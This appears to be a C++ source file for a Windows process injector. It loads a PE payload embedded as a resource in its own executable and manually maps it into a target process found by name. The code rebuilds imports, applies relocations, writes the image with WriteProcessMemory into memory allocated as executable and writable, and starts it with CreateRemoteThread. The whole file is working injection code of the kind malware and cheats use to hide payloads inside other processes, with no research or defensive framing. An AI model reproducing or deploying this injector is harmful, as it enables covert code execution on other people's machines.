#include <Windows.h>
#include <TlHelp32.h>

#include "helper.h"
#include "injector.h"
#include "resource.h"

bool Injector::GetProcess() {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (::Process32First(hSnapshot, &pe32)) {
		while (::Process32Next(hSnapshot, &pe32)) {
			if (wcsicmp(pe32.szExeFile, this->szProcessName.c_str()) == 0) {
				HANDLE hProcess = ::OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				::CloseHandle(hSnapshot);
				this->payload->hProcess = hProcess;
				return true;
			}
		}
	} else
		return ::CloseHandle(hSnapshot), false;

	return false;
}

bool Injector::MemoryMapPayload(LPVOID lpPayload) {
	// get DOS header
	PIMAGE_DOS_HEADER pidh = reinterpret_cast<PIMAGE_DOS_HEADER>(lpPayload);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(lpPayload) + pidh->e_lfanew);

	HANDLE hMapping = ::CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, pinh->OptionalHeader.SizeOfImage, NULL);
	if (hMapping) {
		LPVOID lpMapping = ::MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
		if (lpMapping) {
			// map payload to memory
			// copy headers
			::CopyMemory(lpMapping, lpPayload, pinh->OptionalHeader.SizeOfHeaders);
			// copy sections
			for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
				PIMAGE_SECTION_HEADER pish = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD>(lpPayload) + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
				::CopyMemory(reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(lpMapping) + pish->VirtualAddress), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD>(lpPayload) + pish->PointerToRawData), pish->SizeOfRawData);
			}
			this->vPayloadData = std::vector<BYTE>(reinterpret_cast<LPBYTE>(lpMapping), reinterpret_cast<LPBYTE>(lpMapping) + pinh->OptionalHeader.SizeOfImage);
			::UnmapViewOfFile(lpMapping);
			::CloseHandle(hMapping);
			return true;
		}
		::CloseHandle(hMapping);
	}

	return false;
}
 
/*
 * Walk the relocation table and fix the location
 * of data with the delta offset
 * https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
 */
bool Injector::BaseRelocate(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh, DWORD dwDelta) {
	IMAGE_BASE_RELOCATION *r = reinterpret_cast<IMAGE_BASE_RELOCATION *>(reinterpret_cast<DWORD>(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); //The address of the first I_B_R struct 
	IMAGE_BASE_RELOCATION *r_end = reinterpret_cast<IMAGE_BASE_RELOCATION *>(reinterpret_cast<DWORD_PTR>(r) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION)); //The addr of the last
	for (; r < r_end; r = reinterpret_cast<IMAGE_BASE_RELOCATION *>(reinterpret_cast<DWORD_PTR>(r) + r->SizeOfBlock)) {
		WORD *reloc_item = reinterpret_cast<WORD *>(r + 1);
		DWORD num_items = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (DWORD i = 0; i < num_items; ++i, ++reloc_item) {
			switch (*reloc_item >> 12) {
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*(DWORD_PTR *)(reinterpret_cast<DWORD>(lpBaseAddress) + r->VirtualAddress + (*reloc_item & 0xFFF)) += dwDelta;
					break;
				default:
					return false;
			}
		}
	}

	return true;
}

/*
 * Walk the import table and fix the addresses
 */
bool Injector::RebuildImportTable(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh) {
	// parse import table if size != 0
	if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		// https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<DWORD>(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		// Walk until you reached an empty IMAGE_IMPORT_DESCRIPTOR
		while (pImportDescriptor->Name != NULL) {
			// get the name of each DLL
			LPSTR lpLibrary = reinterpret_cast<PCHAR>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->Name);

			HMODULE hLibModule = ::LoadLibraryA(lpLibrary);

			PIMAGE_THUNK_DATA nameRef = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->Characteristics);
			PIMAGE_THUNK_DATA symbolRef = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->FirstThunk);
			PIMAGE_THUNK_DATA lpThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(reinterpret_cast<DWORD>(lpBaseAddress) + pImportDescriptor->FirstThunk);
			for (; nameRef->u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
				// fix addresses
				// check if import by ordinal
				if (nameRef->u1.AddressOfData & IMAGE_ORDINAL_FLAG)
					*(FARPROC *)lpThunk = ::GetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef->u1.AddressOfData));
				else {
					PIMAGE_IMPORT_BY_NAME thunkData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<DWORD>(lpBaseAddress) + nameRef->u1.AddressOfData);
					*(FARPROC *)lpThunk = ::GetProcAddress(hLibModule, reinterpret_cast<LPCSTR>(&thunkData->Name));
				}
			}
			::FreeLibrary(hLibModule);
			// advance to next IMAGE_IMPORT_DESCRIPTOR
			pImportDescriptor++;
		}
	}

	return true;
}

//bool Injector::ParseExportTable(HANDLE hProcess) {
//	return false;
//}

Injector::Injector(std::wstring szProcessName) {
	this->bUpdate = false;
	this->szProcessName = std::wstring(szProcessName);
	this->payload = new struct _payload;
}

Injector::Injector(std::wstring szFileName, DWORD dwOptions) {
	this->bUpdate = true;
	this->szFileName = std::wstring(szFileName);
	this->dwOptions = dwOptions;
}

Injector::~Injector() {
	::CloseHandle(this->payload->hProcess);
	delete this->payload;
}

BOOL CALLBACK EnumResNameProc(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName, LONG_PTR lParam) {
	// TODO: CHECK RESOURCE NAME FOR DLL PAYLOAD
	HRSRC *h = reinterpret_cast<HRSRC *>(lParam);
	HRSRC hRsrc = ::FindResource(hModule, lpszName, lpszType);
	if (!hRsrc) return TRUE;
	// if found, stop enumerating
	else {
		*h = hRsrc;
		return FALSE;
	}

	return TRUE;
}

bool Injector::HasPayload() {
	// get own module
	HMODULE hModule = ::GetModuleHandle(NULL);
	if (!hModule) return false;

	// enumerate resources and select raw data
	// result variable
	HRSRC hRsrc = NULL;
	if (!::EnumResourceNames(hModule, L"PAYLOAD", EnumResNameProc, reinterpret_cast<LPARAM>(&hRsrc)) && GetLastError() != ERROR_RESOURCE_ENUM_USER_STOP)
		return false;	// fail if no PAYLOAD resources are found

	if (!hRsrc) return false;

	this->payload->hResPayload = hRsrc;

	return true;
}

bool Injector::LoadFromResource() {
	// get resource size
	DWORD dwSize = ::SizeofResource(::GetModuleHandle(NULL), this->payload->hResPayload);
	// load resource
	HGLOBAL hResData = ::LoadResource(NULL, this->payload->hResPayload);
	if (hResData) {
		// get pointer to data
		LPVOID lpPayload = ::LockResource(hResData);
		if (lpPayload) {
			// save to vector
			if (MemoryMapPayload(lpPayload))
				return true;
		}
	}

	return false;
}

bool Injector::InjectPayload() {
	if (!GetProcess())
		return Debug(L"Could not find process: %lu\n", GetLastError()), false;

	// get DOS header
	PIMAGE_DOS_HEADER pidh = reinterpret_cast<PIMAGE_DOS_HEADER>(this->vPayloadData.data());
	// get NT headers
	PIMAGE_NT_HEADERS pinh = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(this->vPayloadData.data()) + pidh->e_lfanew);

	// check valid PE file
	if (pidh->e_magic != IMAGE_DOS_SIGNATURE || pinh->Signature != IMAGE_NT_SIGNATURE)
		return Debug(L"Signature error\n"), false;

	// allocate space in target process
	this->payload->lpAddress = ::VirtualAllocEx(this->payload->hProcess, NULL, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!this->payload->lpAddress)
		return Debug(L"Failed to allocate space: %lu\n", GetLastError()), false;

	// fix the payload locally first before writing to target process
	// fix import table
	if (!RebuildImportTable(reinterpret_cast<LPVOID>(this->vPayloadData.data()), pinh))
		return Debug(L"Failed to parse import table: %lu\n", GetLastError()), false;

	// base relocate
	// get delta offset of image bases
	DWORD dwDelta = reinterpret_cast<DWORD>(this->payload->lpAddress) - pinh->OptionalHeader.ImageBase;
	if (!BaseRelocate(reinterpret_cast<LPVOID>(this->vPayloadData.data()), pinh, dwDelta))
		return Debug(L"Failed to relocate base: %lu\n", GetLastError()), false;

	// copy to process
	//if (!CopyHeadersAndSections(this->payload->hProcess, pidh, pinh))
	if (!::WriteProcessMemory(this->payload->hProcess, this->payload->lpAddress, this->vPayloadData.data(), pinh->OptionalHeader.SizeOfImage, NULL))
		return Debug(L"Failed write payload: %lu\n", GetLastError()), false;

	this->payload->dwEntryPoint = reinterpret_cast<DWORD>(this->payload->lpAddress) + pinh->OptionalHeader.AddressOfEntryPoint;

	return true;
}

INT Injector::ExecuteDll(bool bWait, bool bDetach) {
	// get DOS header
	PIMAGE_DOS_HEADER pidh = reinterpret_cast<PIMAGE_DOS_HEADER>(this->vPayloadData.data());
	// get NT headers
	PIMAGE_NT_HEADERS pinh = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(this->vPayloadData.data()) + pidh->e_lfanew);

	// walk and execute TLS

	DWORD dwExitCode = -1;
	// get entry point
	if (this->payload->dwEntryPoint) {
		// execute entry point
		HANDLE hThread = ::CreateRemoteThread(this->payload->hProcess, NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(this->payload->dwEntryPoint), reinterpret_cast<LPVOID>(this->payload->lpAddress), 0, NULL);
		if (!hThread)
			return Debug(L"Failed to start payload: %lu\n", GetLastError()), -1;

		if (bWait) {
			Debug(L"Waiting for payload thread...\n");
			::WaitForSingleObject(hThread, INFINITE);
			if (!::GetExitCodeThread(hThread, &dwExitCode))
				dwExitCode = -1;
		}

		if (bDetach)
			::VirtualFreeEx(this->payload->hProcess, this->payload->lpAddress, pinh->OptionalHeader.SizeOfImage, MEM_RELEASE);
	}

	return dwExitCode;
}

bool Injector::LoadFromDisk() {
	return false;
}

bool Injector::UpdatePayload() {
	return false;
}
